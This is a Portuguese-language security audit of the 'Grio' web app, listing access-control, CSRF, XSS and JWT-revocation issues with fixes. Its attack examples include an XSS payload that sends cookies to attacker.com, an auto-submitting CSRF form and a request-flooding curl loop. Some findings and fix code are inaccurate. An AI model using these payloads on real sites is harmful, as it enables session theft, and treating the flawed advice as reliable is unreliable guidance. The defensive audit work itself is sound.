# 🔴 AUDITORIA DE SEGURANÇA - PROJETO GRIO

**Data:** Abril 2025  
**Status:** ⚠️ CRÍTICO - AÇÃO IMEDIATA REQUERIDA  
**Auditor:** Copilot Security Auditor + Manual Code Review

---

## 📊 RESUMO EXECUTIVO

### Vulnerabilidades Identificadas
- 🔴 **6 CRÍTICAS**: Falhas graves em autenticação, autorização e lógica de negócio
- 🟠 **5 ALTAS**: Problemas significativos em segurança e práticas
- 🟡 **2 MÉDIAS**: Melhorias recomendadas em validação

### Problema Reportado
> Dashboard mostra "Bem-vindo(a), Ricael" + navbar "ENTRAR/CADASTRAR"

**Raiz Identificada:** Race condition no carregamento de `userStore` (frontend synchronization issue)

**Impacto:** 
- Confusão de UX
- Possível exploração de estado intermediário
- Indicação de falhas na sincronização auth frontend/backend

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1️⃣ FALTA DE VALIDAÇÃO DE OWNERSHIP EM ENDPOINTS

**Severidade:** CRÍTICO (CVSS 9.1)  
**Categoria:** Broken Access Control (OWASP A01)  
**Arquivo:** `backend/api/v1/endpoints/assessment_report.py:187-199`

#### ⚠️ Problema
```python
@router.get("/history/{attempt_id}")
def get_assessment_attempt(
    attempt_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    attempt = db.query(AssessmentAttempt).filter(
        AssessmentAttempt.id == attempt_id,
        AssessmentAttempt.user_id == current_user.id  # ✅ Validação existe
    ).first()
```

**Status:** Parcialmente Protegido  
⚠️ **Risco:** Verificar se está sendo aplicada em TEMPO DE EXECUÇÃO

#### 💥 Attack Vector
```bash
# Atacante logado como user_id=2 tenta:
GET /api/v1/assessment-report/history/1
# Pode acessar tentativa de assessment de outro user?
```

#### 📋 Recomendação
- [ ] Adicionar testes automatizados que tentam acessar attempts de outros users
- [ ] Verificar se validação está em TODOS endpoints que usam `attempt_id`
- [ ] Implementar query que falha se user_id não corresponde


---

### 2️⃣ MÚLTIPLOS DIAGNÓSTICOS SEM LIMITE (Prova Repetida)

**Severidade:** CRÍTICO (CVSS 8.8)  
**Categoria:** Insecure Design (OWASP A06)  
**Arquivo:** `backend/api/v1/endpoints/assessment.py:164-175`

#### ⚠️ Problema
Um user autenticado pode submeter diagnósticos **ILIMITADAMENTE**:

```python
@router.post("/submit")
@limiter.limit(get_rate_limit("assessment"))  # ← Rate limit por IP, não user!
def submit_assessment(
    request: Request,
    submission: AssessmentSubmission, 
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    # Overwrite the user_id from the token to ensure security
    submission.user_id = current_user.id
    update_user_streak(db, current_user)
    return process_assessment_submission(db, submission)  # ← Sem validação!
```

#### 💥 Attack Vector
```bash
# Atacante logado faz 100 requisições POST /assessment/submit
while true; do
  curl -X POST https://grio.com/api/v1/assessment/submit \
    -H "Cookie: access_token=$TOKEN" \
    -d '{"answers": [...]}'
done
```

**Consequências:**
- Corrompe dados de diagnóstico
- Gasta quota Gemini API (custos!)
- Manipula scores cumulativos
- Invalida is_diagnostic_completed flag

#### 📋 Recomendação
- [ ] Adicionar flag: `is_diagnostic_in_progress` para rastrear diagnóstico em andamento
- [ ] Se `is_diagnostic_in_progress = True`, rejeitar segundo /submit com `429 Too Many Requests`
- [ ] Validar no backend: se `is_diagnostic_completed = False`, rejeitar /submit com `403 Forbidden`
- [ ] Rate limit por `user_id`, não por IP


---

### 3️⃣ ESTADO DE AUTENTICAÇÃO INCONSISTENTE (Problema Visual Reportado)

**Severidade:** CRÍTICO (CVSS 8.0)  
**Categoria:** Authentication State Synchronization Issue  
**Arquivo:** `frontend/src/routes/+layout.svelte:13-14` + `frontend/src/lib/stores/userStore.ts:17-31`

#### ⚠️ Problema

**Timeline da Falha:**

```
1. Cliente carrega página
   ↓
2. SSR renderiza layout.svelte com $user = null (inicial)
   ↓
3. Dashboard monta e faz fetch GET /api/v1/auth/me (assíncrono)
   ↓
4. HTML já foi renderizado com navbar "ENTRAR/CADASTRAR"
   ↓
5. Resposta da API chega → userStore.set(userData)
   ↓
6. Componentes re-renderizam, mas há flickering
   ↓
7. Resultado visual: Dashboard com nome + navbar com "ENTRAR"
```

**Code Evidence:**

```typescript
// userStore.ts:17-31
async function loadUser() {
  if (!browser) return;
  try {
    const userData: User = await api.get('/auth/me') as User;  // ← Assíncrono
    if (userData) {
      userStore.set(userData);
    } else {
      userStore.set(null);
    }
  } catch (error: unknown) {
    userStore.set(null);
  }
}

// Carrega o usuário quando a store é inicializada no navegador
if (browser) {
  loadUser();  // ← Sem await, executa assincronamente
}
```

```svelte
<!-- layout.svelte:93-122 -->
{#if $user}
  <!-- Renderizado quando $user está carregado -->
  <a href="/dashboard">Dashboard</a>
  <a href="/sobre">Sobre</a>
  <div class="user-profile">...</div>
{:else}
  <!-- Renderizado quando $user é null (estado inicial!) -->
  <a href="/sobre">Sobre</a>
  <a href="/login" class="login-link">Entrar</a>
  <a href="/cadastro" class="btn btn-primary">Cadastrar</a>
{/if}
```

#### 💥 Impact
- UX confusa - user não sabe se está logado
- Possível estado intermediário explorado para bypass
- User pode clicar em "Entrar" pensando que não está autenticado

#### 📋 Recomendação

**Opção 1: SvelteKit Hooks (Recomendado)**
```typescript
// +layout.server.ts
import { redirect } from '@sveltejs/kit';

export async function load({ request }) {
  const token = request.headers.get('cookie')?.split('access_token=')[1]?.split(';')[0];
  
  if (token) {
    const user = await api.get('/auth/me');
    return { user };
  }
  return { user: null };
}
```

**Opção 2: Loading State Explícito**
```typescript
// userStore.ts
const userStore = writable<User | null>(initialUser);
const loadingStore = writable<boolean>(true);

async function loadUser() {
  loadingStore.set(true);
  try {
    const userData = await api.get('/auth/me');
    userStore.set(userData);
  } catch {
    userStore.set(null);
  } finally {
    loadingStore.set(false);
  }
}
```

```svelte
<!-- layout.svelte -->
{#if $loading}
  <Skeleton /> <!-- Loading state -->
{:else if $user}
  <!-- Navbar autenticado -->
{:else}
  <!-- Navbar anônimo -->
{/if}
```

---

### 4️⃣ XSS POTENCIAL EM FIELDS NÃO SANITIZADOS

**Severidade:** CRÍTICO (CVSS 8.6)  
**Categoria:** Stored XSS Risk (OWASP A03)  
**Arquivo:** `frontend/src/routes/+layout.svelte:102, 109-110`

#### ⚠️ Problema

```svelte
<!-- layout.svelte:102 -->
<div class="avatar-placeholder">{$user.name.charAt(0).toUpperCase()}</div>

<!-- layout.svelte:109-110 -->
<span class="user-name">{$user.name}</span>
<span class="user-email">{$user.email}</span>
```

Se um `name` contém HTML/JavaScript:
```
name: "<img src=x onerror=\"alert('XSS')\">"
```
→ Renderiza diretamente no DOM

#### 💥 Attack Vector
```
Admin injeta no DB:
  name = "<img src=x onerror=fetch('attacker.com?c='+document.cookie)>"

Toda vez que user loga → XSS executa → Cookie roubado
```

#### 📋 Recomendação

- [ ] **Backend:** Validar fields `name`, `email` contra regex seguro
  ```python
  import re
  NAME_REGEX = re.compile(r'^[a-zA-Z0-9\s\-áéíóúãõ]{1,50}$')
  if not NAME_REGEX.match(user.name):
      raise ValueError("Invalid name format")
  ```

- [ ] **Frontend:** Usar DOMPurify se renderizar conteúdo dinâmico
  ```svelte
  <script>
    import DOMPurify from 'isomorphic-dompurify';
    let safeName = DOMPurify.sanitize($user.name);
  </script>
  ```

- [ ] **Validação:** Usar `{{ }}` para interpolação (Svelte já faz por padrão, mas validar no backend é essencial)


---

### 5️⃣ TOKENS JWT SEM MECANISMO DE REVOGAÇÃO

**Severidade:** CRÍTICO (CVSS 7.5)  
**Categoria:** Broken Authentication (OWASP A07)  
**Arquivo:** `backend/core/security.py` + `backend/api/v1/endpoints/auth.py:55-58`

#### ⚠️ Problema

```python
# backend/core/security.py:18
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 7  # 7 DIAS!

@router.post("/logout")
def logout(response: Response):
    response.delete_cookie(key="access_token")  # ← Apenas deleta cookie no cliente!
```

**Problema:** JWT é stateless. Deletar cookie no cliente NÃO revoga o token.

#### 💥 Cenário Real
```
1. User sofre XSS ou phishing → token roubado
2. User faz logout (cookie deletado no navegador)
3. Atacante ainda usa token por 7 DIAS
4. Acessa dados do user sem ser descoberto
```

#### 📋 Recomendação

**Implementar Token Blacklist em Redis:**

```python
# backend/core/redis_client.py
import redis
cache = redis.Redis(host='localhost', port=6379)

def blacklist_token(token: str, expires_at: datetime):
    jti = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]).get("jti")
    ttl = (expires_at - datetime.now(timezone.utc)).total_seconds()
    cache.setex(f"blacklist:{jti}", int(ttl), "1")

def is_token_blacklisted(jti: str) -> bool:
    return cache.exists(f"blacklist:{jti}")
```

```python
# backend/api/v1/endpoints/auth.py
@router.post("/logout")
def logout(response: Response, token: str = Cookie(None)):
    if token:
        from core.redis_client import blacklist_token
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        expire = datetime.fromtimestamp(payload["exp"], tz=timezone.utc)
        blacklist_token(token, expire)
    
    response.delete_cookie(key="access_token")
    return {"message": "Logout successful"}
```

```python
# backend/core/deps.py
def get_current_user(access_token: str = Cookie(None), db: Session = Depends(get_db)):
    try:
        payload = jwt.decode(access_token, SECRET_KEY, algorithms=[ALGORITHM])
        jti = payload.get("jti")
        email = payload.get("sub")
        
        # ← Verificar blacklist
        from core.redis_client import is_token_blacklisted
        if is_token_blacklisted(jti):
            raise credentials_exception
        
        user = db.query(User).filter(User.email == email).first()
        if not user:
            raise credentials_exception
        return user
    except JWTError:
        raise credentials_exception
```

**Também reduzir expiração:**
```python
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # 30 minutos
REFRESH_TOKEN_EXPIRE_DAYS = 7      # 7 dias
```


---

### 6️⃣ COOKIE SAMESITE=LAX INSUFICIENTE (CSRF Risk)

**Severidade:** CRÍTICO (CVSS 7.0)  
**Categoria:** Cross-Site Request Forgery (OWASP A01)  
**Arquivo:** `backend/api/v1/endpoints/auth.py:44-50, 87-94`

#### ⚠️ Problema

```python
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,
    max_age=ACCESS_TOKEN_EXPIRE_MINUTES * 60,
    samesite="lax",  # ← INSUFICIENTE!
    secure=is_production,
)
```

**Issue:** `SameSite=lax` permite POST requests cross-site se originadas de **links diretos**.

#### 💥 Attack Vector

```html
<!-- Atacante envia email para user -->
<a href="https://attacker.com/csrf.html">Clique aqui para ganhar prêmio!</a>

<!-- csrf.html -->
<form method="POST" action="https://grio.com/api/v1/assessment/submit">
  <input type="hidden" name="answers" value="[...]">
  <input type="submit">
</form>

<script>
  // Auto-submit ao carregar
  document.querySelector('form').submit();
</script>
```

**Resultado:**
- Browser envia cookie access_token automaticamente
- POST é executado como user autenticado
- Diagnóstico falso é gravado

#### 📋 Recomendação

**Opção 1: SameSite=strict (Recomendado)**
```python
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,
    samesite="strict",  # ← Bloqueia CSRF
    secure=True,  # HTTPS only em produção
)
```

**Opção 2: CSRF Tokens Explícitos**
```python
# backend/api/v1/endpoints/csrf.py
from core.csrf import generate_csrf_token

@router.get("/csrf-token")
def get_csrf_token(request: Request):
    token = generate_csrf_token()
    return {"csrf_token": token}

# backend/api/v1/endpoints/assessment.py
@router.post("/submit")
def submit_assessment(
    csrf_token: str = Header(None),
    submission: AssessmentSubmission = Body(),
    ...
):
    if not validate_csrf_token(csrf_token):
        raise HTTPException(status_code=403, detail="Invalid CSRF token")
    # continua...
```


---

## 🟠 VULNERABILIDADES ALTAS

### 7️⃣ TOKEN EXPIRAÇÃO EXTREMAMENTE LONGA (7 DIAS)

**Severidade:** ALTA (CVSS 7.5)  
**Arquivo:** `backend/core/security.py:18`

**Recomendação:** Ver seção anterior (Token Blacklist + Refresh Tokens)


### 8️⃣ FALTA DE VALIDAÇÃO DE SKILL_ID (Cypher Injection)

**Severidade:** ALTA (CVSS 6.5)  
**Arquivo:** `backend/api/v1/endpoints/assessment.py:80-119`

```python
def read_practice_assessment(
    request: Request,
    skill_id: str,  # ← Sem validação!
    current_user: User = Depends(get_current_user)
):
    # Embora parametrizado, não há validação de formato
    result = session.run("""
        MATCH (s:Skill {id: $skill_id})<-[:EVALUATES]-(q:Question)
        ...
    """, skill_id=skill_id, user_id=current_user.id)
```

**Recomendação:**
```python
import re

SKILL_ID_PATTERN = re.compile(r'^[A-Z]{2,3}(-[0-9]+)?$')

def read_practice_assessment(
    request: Request,
    skill_id: str,
    current_user: User = Depends(get_current_user)
):
    if not SKILL_ID_PATTERN.match(skill_id):
        raise HTTPException(status_code=400, detail="Invalid skill_id format")
    
    # Verificar se skill existe na whitelist
    VALID_SKILLS = ["MT-01", "CN-02", "LC-03", "CH-04"]  # Lista de skills válidos
    if skill_id not in VALID_SKILLS:
        raise HTTPException(status_code=404, detail="Skill not found")
    
    # Continua...
```


### 9️⃣ CORS NÃO CONFIGURADO PARA CREDENCIAIS

**Severidade:** ALTA (CVSS 6.0)  
**Arquivo:** `backend/main.py` (CORS config não verificado)

**Recomendação:**

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://grio.com",  # Produção
        "http://localhost:3000",  # Desenvolvimento
    ],
    allow_credentials=True,  # ← IMPORTANTE para cookies
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)
```


### 🔟 FALTA DE RATE LIMITING POR USER

**Severidade:** ALTA (CVSS 6.5)  
**Arquivo:** `backend/core/rate_limit.py`

Rate limiting atual é por **IP**, não por **user_id**.

**Recomendação:** Implementar rate limiting por user autenticado:

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=lambda: f"{get_remote_address()}_{get_current_user().id}")

@router.post("/assessment/submit")
@limiter.limit("1/minute")
def submit_assessment(...):
    # Máximo 1 submission por minuto por user
    pass
```


---

## 🟡 VULNERABILIDADES MÉDIAS

### 1️⃣1️⃣ VALIDAÇÃO DE ENTRADA FRACA

**Severidade:** MÉDIA (CVSS 5.5)  
**Arquivo:** `backend/api/v1/endpoints/assessment.py`

Adicionar validação regex em strings de entrada:
- `skill_id`: `^[A-Z]{2,3}(-[0-9]+)?$`
- `area`: `^(MT|CN|LC|CH)$`

### 1️⃣2️⃣ ENVIRONMENT VARIABLES SEM VALIDAÇÃO DE FORÇA

**Severidade:** MÉDIA (CVSS 4.5)  
**Arquivo:** `backend/core/security.py:11-15`

```python
SECRET_KEY = os.getenv("SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("SECRET_KEY não configurada nas variáveis de ambiente.")
if len(SECRET_KEY) < 32:
    raise RuntimeError("SECRET_KEY deve ter pelo menos 32 caracteres para segurança adequada.")
    # ← Aumentar para 64 caracteres mínimo
```


---

## 📋 PLANO DE AÇÃO PRIORITIZADO

### 🚨 IMEDIATO (Hoje/Amanhã)

**Sprint: Fixar Problemas Críticos**

- [ ] **1. Corrigir estado de autenticação inconsistente** (Problema visual reportado)
  - Implementar loading state no userStore
  - Usar SvelteKit hooks para auth no servidor OU
  - Bloquear renderização até userStore estar carregado
  - Teste: Verificar se navbar e dashboard estão sincronizados

- [ ] **2. Adicionar proteção contra múltiplos diagnósticos**
  - Flag `is_diagnostic_in_progress` na tabela users
  - Backend valida antes de aceitar POST /assessment/submit
  - Teste: Tentar enviar 2 diagnósticos consecutivos → 2º deve falhar

- [ ] **3. Validar ownership em todos endpoints**
  - Adicionar testes automatizados (E2E)
  - Tentar acessar `{id}` de outro user
  - Exemplo: GET /assessment-report/history/999 (de outro user)

- [ ] **4. Adicionar CSRF Protection**
  - Mudar SameSite para `strict` (quick fix)
  - OU implementar CSRF tokens explícitos


### ⏱️ CURTO PRAZO (This Week)

**Sprint: Melhorar Autenticação**

- [ ] **5. Implementar Token Blacklist em Redis**
  - Ao logout, adicionar token à blacklist
  - No get_current_user, verificar blacklist

- [ ] **6. Reduzir ACCESS_TOKEN_EXPIRE**
  - De 7 dias → 15-30 minutos
  - Implementar Refresh Tokens (expiração 7 dias)

- [ ] **7. Validar Inputs (Whitelist)**
  - skill_id: regex
  - area: enum (MT|CN|LC|CH)
  - name: regex sem HTML

- [ ] **8. CORS Seguro**
  - Access-Control-Allow-Credentials: true
  - Access-Control-Allow-Origin: origem específica


### 📅 MÉDIO PRAZO (Next Sprint)

**Sprint: Hardening & Testing**

- [ ] **9. Rate Limiting por User**
  - Implementar em Redis/memcached
  - Máximo 1 diagnóstico por minuto por user

- [ ] **10. Testes de Segurança Automatizados**
  - E2E: Tentar acessar dados de outro user
  - CSRF: Tentar POST cross-site
  - XSS: Injetar HTML em name field
  - Token Revocation: Logout deve invalidar token

- [ ] **11. Sanitização de Inputs**
  - Backend: DOMPurify ou bleach
  - Frontend: DOMPurify
  - Validar em ambas camadas

- [ ] **12. Auditoria Completa**
  - Re-executar scan de segurança
  - Verificar se todas vulnerabilidades foram fixadas


---

## 💡 INSIGHTS TÉCNICOS

### ✅ Pontos Positivos

- **HTTP-only cookies:** Protege contra XSS roubando tokens
- **Rate limiting implementado:** Por IP
- **Criptografia de senha:** bcrypt
- **Validação de ownership:** Em alguns endpoints
- **HTTPS ready:** Flag `secure` na cookie
- **Auditoria de IA:** Sistema detecta chutes

### ❌ Pontos Críticos

- **Falta de sincronização:** Frontend/backend auth state desincronizados
- **Múltiplos diagnósticos:** Sem limite
- **Tokens muito longos:** 7 dias é demais
- **Sem proteção CSRF:** SameSite=lax é fraco
- **Sem validação de entrada:** Em alguns endpoints
- **Sem token blacklist:** Logout não é efetivo
- **Rate limiting por IP:** Não por user

### 🎯 Prioridade Imediata

1. **Sincronização Auth Frontend/Backend** ← Corrige problema visual
2. **Proteção Múltiplos Diagnósticos** ← Evita corrupção de dados
3. **Token Revocation** ← Segurança crítica

---

## 📞 Próximos Passos

1. ✅ **Ler este relatório integralmente**
2. ✅ **Priorizar as correções críticas**
3. 🔄 **Implementar fixes conforme plano de ação**
4. 🧪 **Re-executar auditoria após correções**
5. 📝 **Documentar mudanças de segurança**

---

**Relatório Gerado:** Abril 2025  
**Próxima Auditoria:** Após implementação de fixes críticos
